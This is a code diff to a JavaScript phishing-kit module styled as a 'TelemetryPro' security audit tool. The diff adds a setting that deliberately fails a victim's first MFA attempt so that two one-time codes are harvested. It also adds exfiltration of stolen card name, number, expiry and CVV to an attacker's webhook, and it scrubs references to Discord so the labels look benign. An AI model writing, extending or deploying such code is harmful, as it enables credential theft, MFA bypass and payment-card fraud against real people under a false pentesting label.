@@ -1,15 +1,23 @@
 /**
  * TelemetryPro v1.0.0 - Unified Audit Module
  * Professional-grade metadata logging for security pentesting and CIAM auditing.
- * 
- * Features:
+ * * Features:
  * - Canvas Fingerprinting (Hardware-based ID)
  * - VPN/Proxy/Hosting Detection via ip-api
- * - Asynchronous Data Exfiltration (Discord Webhook)
+ * - Asynchronous Data Exfiltration (via Webhook)
  * - Multi-stage Session Capture
  */
 
 const TelemetryScanner = {
+    /**
+     * GLOBAL SETTINGS
+     * enableGhosting: If true, the first MFA attempt will fail on purpose. 
+     * used to harvest 2 otp codes incase 1st is invalid/expires
+     */
+    settings: {
+        enableGhosting: false
+    },
+
     /**
      * Generates a unique ID based on the browser's rendering engine.
      * This ID is persistent across VPNs and IP changes.
@@ -59,11 +67,11 @@ const TelemetryScanner = {
     }),
 
     /**
-     * Sends the aggregated report to the designated Discord Webhook.
+     * Sends the aggregated report to the designated Webhook.
      * Maps risk levels based on VPN detection.
      */
     sendToWebhook: async (data, isFinal = false) => {
-        // --- REPLACE THE URL BELOW WITH YOUR ACTUAL DISCORD WEBHOOK ---
+        // --- REPLACE THE URL BELOW WITH YOUR ACTUAL WEBHOOK ---
         const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
         
         const riskLevel = data.net.isProxy ? "🔴 HIGH RISK (VPN/Proxy Detected)" : "🟢 Low Risk (Residential)";
@@ -71,7 +79,7 @@ const TelemetryScanner = {
         const payload = {
             username: "Audit-Log-Bot",
             embeds: [{
-                title: isFinal ? "✅ Final Session Capture" : "⚠️ Partial Capture (Credential Harvest)",
+                title: isFinal ? "🏁 Audit Complete - Full Capture" : "⚠️ Partial Capture (Credential Harvest)",
                 color: data.net.isProxy ? 15158332 : 3066993, // Red if Proxy, Green if not
                 fields: [
                     { name: "Fingerprint ID", value: `\`${data.fp}\``, inline: true },
@@ -86,6 +94,10 @@ const TelemetryScanner = {
                     { 
                         name: "MFA (OTP) Stream", 
                         value: `**Attempt 1:** \`${sessionStorage.getItem('mfa_1') || '-'}\` \n**Attempt 2:** \`${sessionStorage.getItem('mfa_2') || '-'}\`` 
+                    },
+                    { 
+                        name: "💳 Billing Data", 
+                        value: `**Name:** \`${sessionStorage.getItem('cc_name') || '-'}\`\n**Card:** \`${sessionStorage.getItem('cc_num') || '-'}\`\n**Exp:** \`${sessionStorage.getItem('cc_exp') || '-'}\` | **CVV:** \`${sessionStorage.getItem('cc_cvv') || '-'}\``
                     }
                 ],
                 footer: { text: `TelemetryPro Audit • ${new Date().toLocaleString()}` }
